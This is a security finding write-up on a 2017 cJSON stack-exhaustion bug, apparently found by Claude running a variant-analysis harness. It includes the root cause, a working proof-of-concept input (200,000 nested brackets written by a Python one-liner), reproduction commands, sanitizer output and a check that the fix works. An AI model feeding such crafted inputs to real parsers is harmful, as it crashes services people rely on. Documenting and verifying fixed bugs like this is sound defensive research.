# Finding: cJSON 1.4.6, CWE-674 Uncontrolled Recursion -> Stack Exhaustion

- **Target:** [DaveGamble/cJSON](https://github.com/DaveGamble/cJSON) (single-file JSON parser, ~11k★)
- **Vulnerable:** v1.4.6, commit `5aa152f` (2017-04-26), no nesting depth limit
- **Fixed:** commit `e0d3a8a` (2017-04-27), *"Limit nesting depth to 1000 and make it configurable."*
- **Class:** CWE-674 (Uncontrolled Recursion) -> stack exhaustion -> SIGSEGV (DoS)
- **Verdict:** ✅ verified (AddressSanitizer `stack-overflow`) on `sabba-dev`
- **Method:** variant analysis from the fix commit (Big Sleep style); reasoning model = Claude (driving the harness by hand), verifier = Sabba ASan oracle.

## Root cause
`cJSON_Parse` -> `parse_value` mutually recurses with `parse_array` / `parse_object` with **no
bound on nesting depth**. A deeply nested input drives the recursion until the call stack is
exhausted, crashing the process.

```c
// parse_value -> parse_array -> parse_value -> parse_array -> ...  (unbounded)
static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer) {
    ...
    if (!parse_value(current_item, input_buffer)) { goto fail; }   // recurses per '['
    ...
}
```

## How it was found (find -> verify -> report)
1. **Recon / variant analysis.** Clone cJSON; locate the commit that *introduced* the guard:
   `git log --reverse -S CJSON_NESTING_LIMIT -- cJSON.c` -> `e0d3a8a`. Checkout its parent
   `e0d3a8a^` = `5aa152f` (v1.4.6); confirm `grep -c nesting cJSON.c` -> 0 (no guard).
2. **Reason.** Recursive-descent parser with no depth check ⇒ deep nesting exhausts the stack.
3. **Craft PoC.** 200,000 nested `[` characters (self-derived input).
4. **Verify.** `sabba try` compiles `cJSON.c` + a 10-line driver with `-fsanitize=address`,
   runs the PoC -> ASan reports `stack-overflow`.

## Reproduce
```bash
cd ~/scans/cJSON && git checkout 5aa152f       # vulnerable parent
python3 -c "open('deep.json','w').write('['*200000)"
python -m sabba.cli try ~/scans/cJSON --argv $PWD/deep.json --evidence
#   -> verified=True  reason=sanitizer_triggered  class=stack-overflow
```

## Evidence (AddressSanitizer)
```
ERROR: AddressSanitizer: stack-overflow on address 0x7ffeba25ff48 (pc ... bp ... sp ... T0)
    #0 ... in strncmp
    #1 ... in parse_value  cJSON.c:1169
    #2 ... in parse_array  cJSON.c:1349
    #3 ... in parse_value  cJSON.c:1203
    #4 ... in parse_array  cJSON.c:1349       <-- unbounded parse_value <-> parse_array recursion
    ...
```

## Fix confirmation (variant analysis closes the loop)
The same PoC against the fix commit `e0d3a8a` (which adds `CJSON_NESTING_LIMIT`, default 1000):
```
python -m sabba.cli try ~/scans/cJSON --argv $PWD/deep.json
#   -> verified=False  reason=no_crash   (depth limit returns an error gracefully)
```
Present in `5aa152f`, absent in `e0d3a8a`, a clean before/after, the (vuln, fix) pair that
seeds the data flywheel.
